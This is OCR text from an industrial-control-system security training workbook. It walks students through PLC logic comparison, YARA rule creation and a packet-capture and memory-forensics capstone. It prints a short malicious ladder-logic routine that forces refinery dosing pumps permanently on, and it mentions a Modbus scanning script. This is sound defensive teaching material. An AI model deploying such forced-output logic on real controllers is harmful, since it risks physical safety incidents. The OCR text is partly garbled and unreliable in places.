DP1 OF Locali:2:0.Data.1 (Description := "Dosing Pump 1",
RADIX := Decimal);
DP1LO OF Local:2:0.Data.10 (Description := "Dosing Pump 10",
RADIX := Decimal);
DPiGLevel : DINT (RADIX := Decimal) := G;
DPl0Running : BOOL (Description := "Running Status Dosing Pump 10",
RADIX := Decimal) := 0;
DPidStart : BOOL (Description := "Start Timed Dose For DP10",
RADIX := Decimal) := 0;
DPi0Time OF DP1lOTimer.PRE (RADIX := Decimal);
DPi0dTimeDelay OF DP10TimerDelay.PRE (RADIX := Decimal);
DPi0Timer : TIMER (Description := "Timer for Dosing Pump 10") := [0,0,0];
DPi0TimerDelay : TIMER (Description := "Timer Delay for Dosing Pump i0") := [9,0,0];
DPil OF Local:2:0.Data.11 (Description := "Dosing Pump 11",
RADIX := Decimal);
DPiiLevel : DINT (RADIX := Decimal) := 5;
DPiiRunning : BOOL (Description := “Running Status Dosing Pump 11",
RADIX := Decimal) := G;

*Note* If you are unfamiliar with dosing pumps you could talk to an operator in the environment or here you
could Google the information. For brevity, a dosing pump is a pump for the precise flow rate of a chemical or
substance into other fluid flows such as water or gas. They can be used to pump chemicals from a tank into
the process for a chemical reaction as an example. In this environment they are important for the burner and
causing changes to the dosing pumps would likely lead to a catastrophic value if changed too drastically in the
physical process.

Pl OF Local:2:0.Data.16 (Description := "Pump i",
RADIX := Decimal);

P10 OF Locai:2:0.Data.25 (Description := "Pump 10",
RADIX := Decimal);

PlOLevel : DINT (RADIX := Decimal} := 50;

PlGRunning : BOOL (Description := "Running Status Pump 10",
RADIX := Decimal} := 9;

PlOStart : BOOL (Description := "Start Timed Dose For P10",
RADIX := Decimal) := @;

Pl0Time OF P10Timer.PRE (RADIX := Decimal);

PlOTimeDelay OF Pl0TimerDelay.PRE (RADIX := Decimal);

*Answer* We also see the P values are in use in the logic and are related to status of the Pumps. The main
function of this logic file across both the DP values and P values are for the pumps that relate to the Burner
Management process.

© 2021, Robert M. Lee Lab 5.1-4

a we @, @ @ @ @ ® fl *

>»? Omrnmnmnennnm7 ® ®

ww

E)

we WD

ap

2. What is the malicious routine?

BadThings Routine

> Using the Plugin menu, select the Compare pulldown menu and click Compare the two files

> Open the BurnerManagementinfected.L5K file
> Click Plugins > Compare > Compare
> Identify the changes

[Lf CAUsers\sansics\Desktop\Student Files\calistogarefinery\BurnerManagementinfected.L5k - Notepad++

ile Edit Search View Encoding Language Settings Tools Macro Run Plugins Window 7
s2HG 28a ¢4¢ 8 OH Oc¢ mee e|BR Compare >
MIME Tools x
[APARNA PR ERODATHOEE ARPA EAN REEREONERROEEERERERE Converter >
2 NppExport >
Import-Export
4 Version RSLogix 5000 v16é.04 Plugins Admin...

Dragos Inc.
Open Plugins Folder...

Set as First to Compare
Compare
Clear Active Compare

Clear All Compares

Diff since last Save
SVN Diff
Git Diff

Ignore Spaces

Ctri+Alt+1
Ctri+Alt+C
Ctri+ Alt+X
Ctri+ Alt+ Shift+X

Ctri-Alt+D
Ctrl+Alt+V
Ctri+ Alt+G

*Note* This will bring up a side-by-side comparison of both CSV files. Scrolling down through the differences,

you will see the highlighted areas where changes have occurred.

Flmetanagenere 15K 3

eae TimerDrinkStart :
leas RADIX
jese END_TAG

BOOL (Description := "Start The Drink Timer a
:= Decimal) := 07

PROGRAM MainProgram (MAIN := "MainRo}
MODE := 0,

DisabieFlag := 9)

TAG TAS

:= Decimal)

END_TAG END_TAG

ROUTINE BadThings ROUTINE BadThings

4 SSE ESG SE

END_ROUTINE END_ROUTINE

erDrinkStart +

kaboom :

1°) BumerManagementinected L5K E3

BOOL (Description := “Start The Drink Timer ~
RADIX := Decimal) :

BOOL (Descript:

Decimal)
2 DINT (Description
RADIX := Decimal)

+ OTE (kaboom) ;
= XIC (kaboom) OTE (DP1Start) :
¢ XIC (kaboom) OTE (DP2St
: XIC (kaboom) OTE (DP3Star!
i: XIC (ic
¢ XIC (Jab
+ XIC (kaboom) OTE (DPéStar'
: XIC (kaboom) OTE (DF7Star'
+ XIC (kaboom) OTE (DFSStar
1 XIC (kaboom) OTE (DP9Star'
: XIC (kaboom) OTE (DI
: XIC (kaboom) OTE (DF1
: XIC (kaboom) OTE (DF125
+ XIC (kaboom) OTE (DP13Sta:

) OTE (DP4St.
m) OTE (DPSStar!

tag i",

ce Tag 2",

*Note* The obvious addition is the “kaboom” tag and information associated with the “BadThings” routine

(spoiler alert: it’s not so nicely named in real life incidents).

*Answer* BadThings Routine

© 2021, Robert M. Lee

Lab 5.1-5
3. What is occurring in the logic?

A forced on loop on the dosing pumps

kaboom : BOOL (Description := “nothing to see here",
RADIX := Decimal) := 0;
Test_Tag : DINT (Description := "Test Tag 1",
RADIX := Decimal) := 0;
Test_Tag 2 DINT (Description := "Test Tag 2",
RADIX := Decimal) ‘*= 0; ;
END_TAG

ROUTINE BadThings

: OTE (kaboom) ;

: XIC(kaboom) OTE (DP1Start) ;
: XIC(kaboom) OTE (DP2Start) ;
XIC (kaboom) OTE (DP3Start) ;
XIC (kaboom) OTE (DP4Start) ;
XIC (kaboom) OTE (DP5Start) ;
: XIC (kaboom) OTE (DPéStart) ;
: XIC(kaboom) OTE (DP75tart) >;
: XIC(kaboom) OTE (DPSStart);
: XIC(kaboom) OTE (DP9Start) ;
: XIC(kaboom) OTE (DP10Start) ;
: XIC(kaboom) OTE (DP1iStart) ;
: XIC(kaboom) OTE (DP12Start);
: XIC (kaboom) OTE (DP13Start) ;

22zaaz2azaazaaaazaaaaae

*Answer* In many instances of ladder logic the XIC (Examine if Closed) instruction is a fundamental instruction
used in programming PLCs. The XIC instruction checks to see if the specific bit is in a logic HIGH state. If this is
true, the rest of the logic will continue to run. The OTE instruction is known as Output Energize instruction.
The OTE instruction will energize a single bit of data if the input leading to it is true. Therefore, together, this
logic ensures that the tag “kaboom” is set to high at all times. It evaluates and forces several of the DP values
to always stay on forcing the burner management system to always run at full blast. This would likely lead to a
safety incident depending on a number of physical, process, and control variables at the facility. It is very
obviously though the root cause of what took place in our refinery given all the information we have now.

© 2021, Robert M. Lee

Lab 5.1-6

=

“) (@) (@) (2) (By (=) [“) =) “=

m@”) @) “)

wn ®

TD ® ®
Lab 5.2 — YARA Rules

' |Objectives
e Identify quick indicators in the malware samples
' e Develop a YARA Rule for the Indicators

*Scenario Information* We have concluded the investigation but we want to create some simple YARA rules to
quickly scope systems across our organization to ensure we have the full scope of the investigation for the
cleanup work that will commence soon.

<s

<<»

This exercise will utilize your RELICS VM and the malware in the ics515 > calistogarefinery > malware >
F) malware2 folder

1. What are some good indicators from the malware strings of the following files?

Malware samples:

beacon.exe

= flexsvr.exe

“dl RSLINX.exe
FTActivationBoost.exe

vw Go @&

a

© 2021, Robert M. Lee Lab 5.2-1

wy

au
2.

Using YARA which of those strings are found in the engwrkstn_memdump.mem and
viewdesigner_memdump.mem memory files?

© 2021, Robert M. Lee

Lab 5.2-2
wD ww Ww Ww Ww

wp

qs

Task — Create Indicators from the Strings of the Malware

1. What are some good indicators from the malware strings of the following files?
Malware samples:
beacon.exe
flexsvr.exe
RSLINX.exe
FTActivationBoost.exe

beacon.exe

cip hmi_ emulator

__cip_ple_time
python

_cip ple information _

> Start your RELICS VM

> Log into the VM
> LOGIN =relics
> PASSWORD = relics

> Navigate to the malware?2 folder for Calistoga Refinery
> Open a Terminal
> Run the following command in the terminal:
cd /home/relics/Desktop/ics515/calistogarefinery/malware/malware2

> Run Strings against the four designated malware samples and identify strings that would make good
indicators

> Inthe Terminal on each file run the command Strings. Example:
strings beacon.exe

*Note* If it’s easier for you, output the contents to a text file by adding “> name.txt” to the command or run
the command “strings beacon.exe | less” and use the spacebar to progress through the output

© 2021, Robert M. Lee Lab 5.2-3
a

6
Beacon.exe: 6
_dllonexit
etmainargs ¢
_initenv
_lconv_init
set_app_type _
_setusermatherr Ly
acmdin .
cexit -
fmode e
inittern
iob
lock ‘

unlock
winmajor .

KERNEL32.d1L
svcrt.dll

*Note* Nothing really stands out on beacon.exe, you could turn some of these into indicators but for this file
we'll just use the name of the file itself as the indicator i.e. beacon.exe

FTActivationBoost.exe:

-xmlreader )

oeaeeeje#s oo om

hel

eo a

bunicodedata.pyd
manifest-filename cip_hmi_emulator.exe.manifest
srary.zip

-pyz
#python37.dtl

© 2021, Robert M. Lee Lab 5.2-4

on a

aM

Ww WwW Ww WW

w

a WwW Uy wy Ww Ww

qs

*Note* There’s some great options in this file. You could choose a number of things such as “python” as that
would be extremely abnormal on an operator station but we will choose “cip_hmi_emulator” as the indicator.

RSLINX.exe:

plc_information.exe.manifest
rypto-1_1.d1l

manifest-filename cip_plc_information.exe
se_library zip
pyz
thon37.dt1

*Note* Again lots of great choices here and there’s a theme on Python usage in these malware families. We'll
focus on “cip_plc_information” though.

Flexsvr.exe:
Bpyiboot01_ bootstrap

Llect.pyd
icodedata.pyd

spython37.dl

*Note* The “cip_plc_time” indicator will be a good one from this file (this is all subjective and you could
choose a wide variety of items).

*Answer* cip_plc_time, cip_plc_information, cip_hmi_emulator, beacon.exe, and we'll include python
because it came up so many times.

© 2021, Robert M. Lee Lab 5.2-5
Task ~ Develop a YARA Rule for the Indicators

2. Using YARA which of those strings are found in the engwrkstn_memdump.mem and
viewdesigner_memdump.mem memory files?

beacon.exe

python

> Create a YARA rule using the indicators
> Open the Text Editor in the toolbar at the bottom of the RELICS VM
> Create a YARA rule to match the below leveraging the indicators we just found
o You will use the “wide” and “nocase” parameters to search for the letters separated across
multiple bytes which is common to see in memory files and ensuring case sensitivity doesn’t
matter

1rule calistogarefinery

2{

3 strings:

ce) Sal = “cip_plc_time" nocase wide

5 Sa2 = “beacon.exe" nocase wide

6 $a3 = "python" nocase wide

7 $a4 = "cip_hmi_emulator" nocase wide
8 $a5 = “cip_plc_information" nocase wide
9
10 condition:
11 1 of them
12 }

> Save the file in the memory folder
> Save the file in the ics515>calistogarefinery>memory folder

Rene calistogarefinery

relics (]Desktop ics515_—calistogarefinery memory +

> Run the YARA rule against the viewdesigner and engworkstation memory images
> Run the following command
yara -s calistogarefinery engwrkstn_memdump.mem > eng.txt

© 2021, Robert M. Lee Lab 5.2-6

(@)

ey

@)

oP ® & @ @® @ @ @ @ © ® © OO ® © ® OD

w

Vw 8 i

us8

> Run the following command
yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt
> Review the output files by opening them

yara -s calistogarefinery engwrkstn_memdump.mem > eng. txt

$ yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt

z pacittege refinery engwrkstn_memdump.mem

2 Ox62bba2c:$a2: b\xO00e\x00a\x00c\x000\x0On\ x00. \x0e\x00x\x00e\x00
3 Ox707b88e:$a2: b\x00e\x00a\x00c\xO00\x0On\ x00. \xOBe\x0Ox\x00e\x00
4 Ox707cfT6:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xO0e\x00x\xd0e\x00
5 0x70c388e:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \x00e\x0Ox\x00e\x00
6 0x70c4e96:$a2: b\x00e\x00a\x00c\x000\x0On\x00. \xO0e\x0Ox\xO0e\xO0
7 0x70c6156:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \x0Ge\x00x\x00e\x00
8 0x710e88e:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xO0e \x00x\x00e\x00
9 ®x712b88e:$a2: b\xO0e\xd0a\x00c\xO00\ xOOn\ xOO. \xOGe\xOOx\x00eE\x00
10 0x7840f74:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xOBe\x00x\x09e\x00
11 0x808619a:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \x00e\x00x\x00e\x00
12 0x8389482:$a2: B\xQOE\x00A\x00C\x000\xOON\x00. \xOOE\x00X\xO0E\x00

*Note* Widecase searches across multiple bytes in memory for the values. Here we see in the screenshot
“beacon.exe” is spelled out. b\x00 e\x00 a\x00 c\x00 o\x00 n\x00 and so on. We see the following values in
the text file: beacon.exe and python.

*Answer* While there are a lot more hits in the HMI file it’s still the same answer, beacon.exe and python. We
could find other indicators of value but these two seem to be the most consistent and likely the ones we’d
want to use to scope our systems across the organization for a quick indicator search for making sure we
understand the full scope of the investigation.

© 2021, Robert M. Lee Lab 5.2-7
ww w ww ww w Ww w ww Ww WwW LW Ww ww 1w ww ww = er _-_

Ww

_ Day 5 - Mini Capstone — Calistoga Rai

e Gain increased familiarity with the core tools highlighted in the class
e Become familiar with additional types of threats

*Scenario Information* You are a consultant who has been hired to assess the network of a small ICS facility.
The site personnel have gathered some packet captures for you to look through. Using the concepts from the
Active Cyber Defense Cycle, you will familiarize yourself with the network and then search for a. Once you have
potentially identified a threat, you will attempt to uncover information about it and the impacted system. The
on-site personnel have made a supposedly clean baseline available to you, AnalysisSession3, to start with. If
your incident response uncovers anything, you will need to perform some basic analysis on the capabilities of
the threat. Although there is no Threat Intelligence available about any potential threats, it is important for
you to consider that if there is a threat uncovered, how and what you would share with your peers in the
community.

Exercise Prep

You can use any tools, virtual machines, or resources available to you to complete the Day 5 mini-capstone
scenario. Wireshark and Redline will be used in the walkthrough as one approach that can be taken. The data
for the exercise is in the RELICS and Windows VM under the Calistoga Rail folder.

*Note* The following questions are for Capture 4:

Whose iPhone is on the network?

What ICS protocol(s) is on the network?
What is the IP address of the two HMIs?
How many Modbus TCP clients are there?

P@NP

*Note* The following questions are for Capture 5:

What was the referrer for the Phoenix Contact Download firmware?
What zip file is associated with the firmware?

What executable is in the traffic?

What IP address did the executable originate from?

SN AH

*Note* The following questions are for Capture 6:
© 2021, Robert M. Lee ICS515 Day Five Mini-Capstone 1
9.

What is the zip file in the traffic?

*Note* The following questions are for Capture 7:

10.
11.
12.
13.
14.

What odd network traffic is occurring?

What control devices are being targeted?

Are there any odd files that could correlate with this traffic?

What user is associated with the weird traffic?
What IP address is associated with the odd file?

*Note* The following questions are for AnalysisSession3:

15.
16.
17.
18.
19.

What are the two IPv4 addresses for the imaged computer?

What location/folder was “0001.bat” run from?

What malicious program (zip file) was downloaded and used?
Where might the hidden file be located?
Is this activity related to the network activity?

*Note* The following questions are for AnalysisSession4:

20.
21.
22.
23.

*Note* The following questions will require open-source research/Internet searching:

24.
25.
26.
27.
28.

What potentially malicious file did “In Gary” run?
Was “In Gary” an Administrator?

When was the script from the network captures created on the system?
What is the script’s MD5 hash?

What code repository can the malicious script be found on?

Can the script just read registers or also write to them?

Did the use of the script (by its configuration) seem targeted?

Was this likely the work of an external or insider threat?

What kind of information could be shared to help the community?

© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone

2 ® BAB BA BD * 2)

(@)

@)

oe. ae oe oe,

o

oa om

oO
Ww WwW WW WW WW VY Vy wr wwe

Ww

wow Ww

©

Questions — With Walkthrough

*Note* The following questions are for Capture 4:

Capture 4 is a baseline capture of the Internal ICS network.

1.

Whose iPhone is on the network? Tom’s

One way to look for BYOD devices is to search for common strings associated with them. In Wireshark, you
can choose Find Packet under Edit and search for the String “phone”.

File Edit View Go Capture Analyze Statistics Tel

Copy

© Find Packet... <err

Find Next
Find Previous

4 Wireshark Find Packet —
Hes —

| By: ©) Display fitter © Hexvalue @ Sting —

Ecce | phone —_

=| _ Direction: 7

; Search In ; String Options

| @ Packet list Case sensitive | © Up

| © Packet details | | Character width: |® Down
| © Packet bytes | [Narrow & wide

r SSIES OT : r z es ]
bint [find] [cence |

In the packet highlighted, we can view that Tom’s iPhone was connected.

a Toms-iPhone-4, local: type ANY, class IN, “QM” question
Name: Toms-iPhone-4. local
[Name Length: 19]

[Label count: 2]

& (A reouact eet

ait. ecorc oho carvar feache hac available

Tyna:

6d e2 80 99 73 20 69 50 68 6f be 65 Oc 5f 64 65

Ross

Without searching for “phone” though, one of the more reliable methods is to view the MAC addresses
under Wireshark > Endpoints and look for common vendors such as Apple.

© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone 3
2. What ICS protocol(s) is on the network? Modbus TCP and OPC

To search for protocols that Wireshark likely has dissectors for it is useful to look under Protocol Hierarchy.

File Edit View Go Capture Anal Statistics Telephony Tools Intern
©O4m a ate 1B Summary
Comments Summary

Filter:

Show address resolution
0, Time ee dl Protocol Hierarchy

We a ee ee

AZ 611 NE7EIA 1 FE 33 © Ho}

In this case we see Modbus TCP as well as Distributed Computing Environment / Remote Procedure Call
(DCE/RPC). Wireshark does not have an OPC dissector, so it displays OPC as DCE/RPC here because OPC is
a DCOM-based protocol. We do not know for sure that DCE/RPC is actually OPC right now but, in an ICS
environment, this is a good thing to look for; additionally, we can search for the string “OPC” given this
hunch and find that there is a MatrikonOPC Server on the network.

3. What is the IP addresses of the two HMls? 10.25.22.100 and 10.25.22.103

By using Statistics > Conversations in Wireshark, we can see that both 10.25.22.100 and 10.25.22.103 are
speaking with control devices (those using Modbus TCP). We cannot simply rule out the IP address that is
using OPC because the SCADA server itself might have an OPC server on it as well. In this case, we can
filter down to the two IP addresses. But just those two IP addresses won’t tell us much; we want to use
other communications that might be on the network—like the Windows netBIOS name service. Thus, one
method is to filter down to the two IP addresses and the netBIOS name service, which is represented in
Wireshark as nbns.

4 Capture 4.pcapng_ [Wireshar
File Edit View Go Capture Analyze Statistics Telephony Tools Internals Help

©O4BAZ\/SBSExX2 Qe ev aTFsi (SB Qaaal wsesx B

Filter: {ip.addr==10.25.22.100 || ip.addr==10.25.22.103) && nbns —" Expression... Clear Apply Save

No. Time Source Destination Protocol Length Info
11925 118. 71196110. 25.22.100 20°25. 22-255 NBNS 92 Name query NB TOM-WORK<20>
11928 118. 712802 10. 25. 22.200 10. 25.22.100 NBNS 122 Name query response NB 10.25.22.200
30113 288.153375 10.25.22.100 16.25522,255 NBNS inet VTSCADA<1c>
30207 288. 90319510. 25. 22.100 10.25.22.255 NBNS me query NB VTSCADA<ic>

From here, we see that 10.25.22.100 identifies itself as the VISCADA server. Looking through the traffic,
we also see that 10.25.22.103 does as well. 10.25.22.100 also later identifies itself as SCADA2. This
network thus has two HMI servers. You will find 10.25.22.101 as well being active but it’s only doing
Read requests and is not tagged in the same naming convention in the name queries as the HMIs. While
harder to determine, we could determine this is likely a Historian and not an HMI. If you include all
three answers that’s ok, but in fact only .100 and .103 are the HMIs.

4. How many Modbus TCP clients are there? Four

© 2021, Robert M. Lee ICS515 Day Five Mini-Capstone 4

(®) (@>

(®)

me & &© ©

®
w Ww Ww ww ww Tw Tw Tw wy Tw yw Ww

y w

“uF

ay

ww a wy a ay

w

We can create a filter for Modbus TCP (type mbtcp into the Filter box and click Apply). Then click on
Endpoints but at the bottom of the box click “Limit to display filter” so that only devices that are being
displayed by our filter are counted. There are then four clients the SCADA servers are polling. They are
10.25.22.3, 10.25.22.5, 10.25.22.6, and 10.25.22.8.

*Note* The following questions are for Capture 5:

Capture 5 is located from the DMZ where the Internet can be accessed. It was captured for you by the site
personnel.

5. What was the referrer for the Phoenix Contact Download firmware? _http://freefirmware/downloads

When opening this packet capture, it is quickly obvious there is more than just control system
communication going on—in this case there is HTTP web traffic. To see what is going on, we can select the
first HTTP traffic we see (or filter down to HTTP) which is packet number 16. By right clicking it and
selecting Follow TCP Stream, we can see what is going on.

583 GET /downloads/Phoenixcq SIEM
60 [TCP window Update] 80-4 Mark Packet (toggle)
60 8049250 [ACK] Seq=1 Ack _ |gnore Packet (toggle)

71 [TcP segment of a reass¢ © Set Time Reference (toggle)
p35 HTTP/1.0 200 OK (text/H © TimeShift...

60 49250-80 [ACK] Seq=530 4

60 49250-80 [FIN, ACK] Seq- Edit Packet

i Packet Comment...

60 80-49250 [ACK] Seq=900 4
82 Source port: 49152 Dest

Manually Resolve Address

Apply as Filter

| Prepare a Filter
on interface 0 | Conversation Filter
:84:b1 (00:30:44:06:84: ba) | Colorize Conve: n
A, 2.2 :(20.24..2)
pecs (ite! Ba | ocean

a a a

+

SCTP
Follow TCP Stream

A Follow TCP Stream (tcp.stream eq 0)

Stream Content =

GET /downloads/Phoenixcontact-Download_2014~12-30_14-44-27/ HTTP/1.1 . _
Accept: ede Me ee a bo jmage/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*
Referer: http 7/#rect irmat e/down 103d / -ijemmnmesamememesnem

| Accept-Language: en-US

User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; windows NT 6.1; win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR
3.5.30729; .NET CLR 3,0.30729; Media Center PC 6.0)

UA-CPU: AMD64

Accept-Encoding: gzip, deflate

Host: freefirmware

connection: Keep-Alive

The referrer for this session was http://freefirmware/downloads which is immediately a bad sign to see.
Firmware updates should only ever come from approved vendor sources.

6. What zip file is associated with the firmware? AX SW SUITE 1.81 AddOn vi.zip _

© 2021, Robert M. Lee ICS515 Day Five Mini-Capstone 5
In the same TCP Stream as the last session, we see that the content returned from the GET request
included a zip file and an executable. There is a version 1 and 2 of both files.

7. What executable is in the traffic?

AX SW SUITE 1.81 AddOn V1.exe

We can see the executable in the previous question’s location as well; however, another reliable way to
see files being passed for unencrypted sessions is to go to File > Export Objects > HTTP.

Export Specified Packets...
Export Packet Dissections
Export Selected Packet Byt
Export PDUs to File...
! Export SSL Session
Export Objects

& Print...

Qpen... Ctrl+O >pt &
Open Recent »
Merge... :
Import from Hex Dump... Destination
| 9€ Close Ctrl+W FFO2: ic

® Save Ctl+S BTFO2Z::c

7) Save As... Shift+Ctrl+$ ane
File Set

The executable is there and is 40MB large. It would be good to save it for the Threat and Environment
Manipulation folks to examine later. This is outside the scope of this scenario, though.

8. What IP address did the executable originate from?

10.1.1.2

The IP address associated with the HTTP traffic is 10.1.1.2; this is interesting because it is an internal IP

address and every session is through that IP address. Therefore, this is likely a proxy that is in use internal

to the network. Proxies are a great source of logs and forensic evidence, including timestamps of

requested sessions.

*Note* The following questions are for Capture 6:

Realizing that there are likely some odd or potentially malicious files coming into the network, you ask the site

personnel to take another capture of the DMZ. This will give you the most recent information from what is

going on in the network.

9. What is the zip file in the traffic?

© 2021, Robert M. Lee

EtherNet IP Made Easy.zip

1CS515 Day Five Mini-Capstone 6

ey Bf ® oO

aoeoene @

onee

’

fa,
ay

O24

ww

Ww Ww a ay ay ay ay ay w

Since Capture 6 also has HTTP traffic, we can again go to File > Export Objects > HTTP and see if anything
comes up. In this case, we see the zip file “EtherNet_IP_Made_Easy.zip” from the same freefirmware
website as the other zip files. An engineer on the network is likely trying to update the firmware of a
device or get help and has simply made some poor choices on where to go.

*Note* The following questions are for Capture 7:

The files observed in the DMZ are very likely intended for the Internal ICS zone because of the relevance of the
files to control devices. You thus ask the site personnel to take a capture of the Internal ICS zone so that you
can have the most recent information. They have reported that weird activity is going on with the ICS.

10.

11.

12.

What odd network traffic is occurring? Enumeration

A quick look at the capture shows that there are a lot of TCP Retransmissions and Duplicate ACKs. It
appears the communication to the Modbus TCP clients is faster than it was previously and that they are
potentially being enumerated.

What control devices are being targeted? All four

Apparently, all four devices are being scanned. Hawever, there is no indication of other devices, so the
scan seems targeted in nature. °

Are there any odd files that could correlate with this traffic? script.bat

Something odd is obviously occurring, so it is important to search for anything that could be the root
cause. We know that there were weird files being transferred into the network, so we can search for those
like we did earlier with Export Objects > HTTP. That reveals nothing; however, this is internal to the
network so maybe files are being passed back and forth through SMB. Thus, we can choose Export Objects
> SMB. This reveals interesting files including script.bat. This file, in the real world, would be saved off and
sent to the Threat and Environment Manipulation folks to analyze.

29735 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [100.00%] 226 bytes \Users\In Gary\script.bat
29747 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [10.00%] 226 bytes \Users\In Gary\script.bat
29819 —\\10.25.22.105\TREEID_2049 FILE (226/226) R [100.00%] 226 bytes \Users\In Gary\script.bat
>
Help Save As Save All Cancel

Better yet, though, when clicking on the “script.bat” file in the Export Objects window, we can also look in
the SMB blocks themselves (such as Packet Number 29735). There we see “mbtget.p!” which is a Perl
script. That is important to note for now as it is likely the script that our “script.bat” is running.

© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone 7
25.22.8. .mbtget.
pl -ws 1 -a 5 10
725.22. 2 3. . GOTO
loop. ..-

13. What user is associated with the weird traffic? In Gary

From the Export Objects > SMB feature in Wireshark, we see that the script.bat file is running out of the
user account “In Gary”.

14. What IP address is associated with the odd file? 10.25.22.105
We can select the file in the Export Objects > SMB window and it will highlight the packet related to that

session in the main Wireshark view. There we see that the IP address is 10.25.22.105. This is a good time
to initiate incident response procedures and grab that IP address’ digital image.

QO

em, @&

r
29734 373, 376351 10. 25. 22.103 10, 25.22.105 117 Read Andx Request, FID: 0x000a, 226 bytes at offset 0

29735 373, 37638610. 25, 22.105 10,25. 22.103 ; 344 Read Andx Response, FID: 0x000a, 226 bytes

29736 373. 377208 10. 25. 22.103 10.25.22.105 184 Trans2 Request, QUERY_PATH_INFO, Query File Basic Info, Path: \users\in Gary\script. en
Pret m sae]

4h 3629 1n> cup 400 Trane? Qocnonca Aliroy DaTY Turn

*Note* The following questions are for AnalysisSession3:

Although it is obvious that there is malicious activity going on in the ICS, you need to familiarize yourself with
the baseline forensic capture that the site personnel made previously. Simply jumping into the new capture will

take even longer to familiarize yourself without doing this. It is important to remain calm and composed even
in a potential incident scenario.

15. What are the two |Pv4 addresses for the imaged computer? 10.25.22.105 and 169.254.18.199

In Redline, go to the System Information tab, expand it out, and select Network Adapters. This is where
you can see what IP addresses are, or have been recently, associated with the image.

Analysis Data ' Intel(R) PRO/1000 MT Netwo

System Information Adapter:

|| DHCP Lease Expires:

» Processes

. a IP Infomation (Subnet Mask):
Hierarchical Processes

feb0:708a:7e3:dels:12c7 ()}
File System 10.25,22,105 (}
Registry 169.254.168.199 (}

© 2021, Robert M. Lee ICS515 Day Five Mini-Capstone 8

®

o@moqonw®® ®

aad od ed od ee a

<=

ww way vy wy ww

@- @ @

16.

Here we see that 10.25.22.105 is observed as we’d hope to see—this was the system related to the
script.bat file. However, there is also the 169.254.18.199 IP address. The 169.254.0.0/16 ranges are
reserved for private IP use under RFC 3927. These IPs are used when a Windows system has been
configured for DHCP, but then it loses contact to the server. This shows us that the system was likely
disconnected when the image was taken. It’s important to make note of this for your incident responders
and tell them to not remove the client from the network when taking images. Valuable data can be lost by

interacting with systems by taking them off the network.
What location/folder was “0001.bat” run from? C:\temp\

It’s important to validate that this baseline image is actually a good baseline. It’s possible that threats are
in the environment or weird behavior is occurring even before the baseline is taken. One easy way to do
this is to look at the Processes tab and notice any interesting events. For example, there is a cmd.exe
process that rana 0001.bat file. We are looking for a potentially malicious bat file, so this should be
examined. It’s possible the operations folks are using the command line for a variety of reasons; however,
the file is run out of the C:\temp\ location which is common for malicious actions. We’d want to flag this
for review and analysis. However, this is not the bat script we are looking for.

=

Processes ; sae ce Xe
Fert 6 sichast.ere § 270A ClWindows\System32 ‘CAWindows\Systemd2isvchostene -kseesies
a cai t
Fle System {) nde err" % 2204 Windows System32 cmd /e"C\temp\Q00" bat'*
Fl Syste a
Registry §) sichostese % QAO CAWindows\System32 Windows System3Z\svchastene-& Locaiystemetworesticted
‘Windows Services ms
Persistence q) sichostere % Ti CAWindows\system32 CAWindowsystem32\svchostexe -k RPCSS
17. What malicious program (zip file) was downloaded and used? steghide-0.5.1-win32.zip

Realizing there is weird activity in the baseline, though, we want to dig further. Because there was HTTP
communication in at least part of the network, we should view the Browser URL History Tab. Instantly,
your attention should be drawn to passwords.txt files, Train25.jpg, and the steghide-0.5.1-win32.zip file.

}| b Disks
Volumes
Registry Hives

Route Entries file://fC:/Users/Valley?20Electric/Downloads/steghide-0.5.1-win32.2ip

C:/Users/Valley%20Electric/Downloads/steghide-0 5.1-win32/steghide/README. txt

files
file:///Cx/Users/Valley%20Electric/Downloads/steghide-0.5 1-win32/steghide/todo.txt

Browser URL History file:///C:/Users/Valley%20Electric/Documents/OpenPutt/OpenPuft/OpenPuff_icense.txt

File Download History
ile Download nistory flev///C./Users/Valley%20Electric/Desktop/steghide-0.5.1 -win32%20(1).zip

418. Where might the hidden file be located?

Train25.jpg

It seems obvious at this point that there was malicious activity occurring prior to the incident. Steghide is
acommon tool for performing steganography—or hiding information inside of images. The password file,
HMI login information, and more was likely placed inside Train25.jpg and exfiltrated off the network.
These files would be passed to the Threat and Environment Manipulation folks, who would circle back
with the Threat Intelligence Consumption folks to research if there are active threats in the community
using these tactics and what they might be doing. It’s also a great opportunity for the Network Security
Monitoring analysts to search for these files inside the network and to cue up the Incident Responders to

© 2021, Robert M. Lee 1CS515 Day Five Mini-Capstone 9
en
keep an eye out for systems with this type of data. For now, though, we will keep our focus on the incident
targeting the control systems directly—that is our priority. on
19. Is this activity related to the network activity? Unlikely
Ls

We cannot say for sure if this activity is related to the network activity we are seeing. What we are seeing
in AnalysisSession3 could be an intelligence gathering phase of an adversary’s kill chain against the ICS.
The activity we are seeing in the network could be that second phase. However, the activity is unlikely

directly related to the network activity. Steghide wouldn’t target the control systems like we saw, and we

have not found the specific bat script we are looking for; for now, it would be good to record this Oo
information but continue searching for the direct links to the activity we saw.
oo
*Note* The following questions are for AnalysisSession4:
on

It is obvious that the baseline capture was not a great baseline and that there were multiple issues going on
before. It appears, though, that these actions observed were likely not related to the activity seen on the
network. There could be multiple issues on the network. But it is important to find the issue that is directly —
impacting the control device.

20. What potentially malicious file did “In Gary” run? script.bat oo

By reviewing the Processes tab after viewing the baseline, we see that there is a new command prompt (a
few actually) including one run by user “In Gary” titled “script.bat”—this is the file we have been looking
for. We also see under the Start Time column that after the script was executed, there are two perl.exe
processes that are running. The “mbiget.pl” file we saw earlier was a Perl script, so this is likely the file ‘4
being executed and the true culprit—we can begin more closely searching for that now.

— - - = i )
Ce 98 1872 .
@ periexe <a 94 2096
@  winlogonexe 2 2668 C\Windows\system32 winlogonexe ‘un
